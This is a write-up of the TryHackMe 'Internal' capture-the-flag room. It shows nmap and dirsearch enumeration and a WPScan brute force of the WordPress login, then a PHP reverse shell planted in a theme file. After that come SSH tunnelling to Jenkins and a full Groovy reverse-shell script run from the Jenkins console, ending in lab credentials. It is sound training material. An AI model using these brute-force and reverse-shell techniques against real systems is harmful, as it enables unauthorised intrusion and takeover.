<img src="https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/Internal%20(THM)/Images/222b3e855f88a482c1267748f76f90e0.jpeg?raw=true" alt="Internal Screenshot" width="500"/>


Internal (Tryhackme)
#Penetration Testing Challenge#

# Enumeration

## Nmap

```jsx
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFOI/P6nqicmk78vSNs4l+vk2+BQ0mBxB1KlJJPCYueaUExTH4Cxkqkpo/zJfZ77MHHDL5nnzTW+TO6e4mDMEw=
|   256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMlxubXGh//FE3OqdyitiEwfA2nNdCtdgLfDQxFHPyY0
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

## HTTP (80)

### Dirsearch

```jsx
[05:28:52] 301 -  313B  - /blog  ->  http://10.10.120.129/blog/             
[05:28:53] 200 -    2KB - /blog/wp-login.php                                
[05:28:53] 200 -   18KB - /blog/                                            
[05:29:29] 301 -  319B  - /javascript  ->  http://10.10.120.129/javascript/ 
[05:29:53] 301 -  319B  - /phpmyadmin  ->  http://10.10.120.129/phpmyadmin/ 
[05:29:55] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[05:29:56] 200 -    3KB - /phpmyadmin/                                      
[05:29:56] 200 -    3KB - /phpmyadmin/index.php
[05:30:08] 403 -  278B  - /server-status/                                   
[05:30:08] 403 -  278B  - /server-status
[05:30:35] 200 -    2KB - /wordpress/wp-login.php                           
[05:30:36] 404 -   51KB - /wordpress/ 
```

### Website functionality

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/2671ded0991d8af2f269acb872174d3993c4bc47/Internal%20(THM)/Images/image%20(3).png)

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/2671ded0991d8af2f269acb872174d3993c4bc47/Internal%20(THM)/Images/image%20(4).png)

- username admin is available
- bruteforce password

## WPScan

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/Internal]
└─$ wpscan --url http://10.10.120.129/blog -e vp,u

┌──(kali㉿kali)-[~/CTF/tryhackme/Internal]
└─$ wpscan --url http://10.10.120.129/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

```jsx
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

## Post Enumeration

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/2671ded0991d8af2f269acb872174d3993c4bc47/Internal%20(THM)/Images/image%20(5).png)

```jsx
william:arnold147
```

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/Internal]
└─$ ssh william@10.10.120.129
william@10.10.120.129's password: 
Permission denied, please try again.
william@10.10.120.129's password: 
```

- ssh cannot connect

### Reverse Shell

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/2671ded0991d8af2f269acb872174d3993c4bc47/Internal%20(THM)/Images/image%20(6).png)

- we upload php-revershell-php

```jsx
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.ph
```

- tick this link

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/Internal]
└─$ nc -lvnp 53    
listening on [any] 53 ...
connect to [10.4.9.248] from (UNKNOWN) [10.10.120.129] 34560
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:06:33 up 44 min,  0 users,  load average: 0.00, 0.14, 0.88
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

```jsx
$ cd /opt
$ ls -lah
total 16K
drwxr-xr-x  3 root root 4.0K Aug  3  2020 .
drwxr-xr-x 24 root root 4.0K Aug  3  2020 ..
drwx--x--x  4 root root 4.0K Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

- we check cat /etc/passwd
- aubreanna is user
- we ssh login

```jsx
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
```

```jsx
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

- the ip may be docker

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/Internal]
└─$ ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.120.129

```

- link connect this docker ip

```jsx
  System information as of Sat Jun  7 10:16:41 UTC 2025

  System load:  0.0               Processes:              112
  Usage of /:   63.8% of 8.79GB   Users logged in:        0
  Memory usage: 37%               IP address for eth0:    10.10.120.129
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.
```

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/2671ded0991d8af2f269acb872174d3993c4bc47/Internal%20(THM)/Images/image%20(7).png)

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/2671ded0991d8af2f269acb872174d3993c4bc47/Internal%20(THM)/Images/image%20(8).png)

- fuzz password

```jsx
admin : spongebob
```

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/2671ded0991d8af2f269acb872174d3993c4bc47/Internal%20(THM)/Images/image%20(9).png)

### Jenkins Reverse Shell

- In jenkins, we can get reverse shell from `scripting console`

```jsx
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

- Can find at groovy reverse shell online
- Change string cmd = `“/bin/sh”`

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/Internal]
└─$ nc -lvnp 8044
listening on [any] 8044 ...
connect to [10.4.9.248] from (UNKNOWN) [10.10.120.129] 60380
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)

```

```jsx
cd opt
ls -lah
total 12K
drwxr-xr-x 1 root root 4.0K Aug  3  2020 .
drwxr-xr-x 1 root root 4.0K Aug  3  2020 ..
-rw-r--r-- 1 root root  204 Aug  3  2020 note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/Internal]
└─$ ssh root@10.10.120.129
root@10.10.120.129's password: 
```
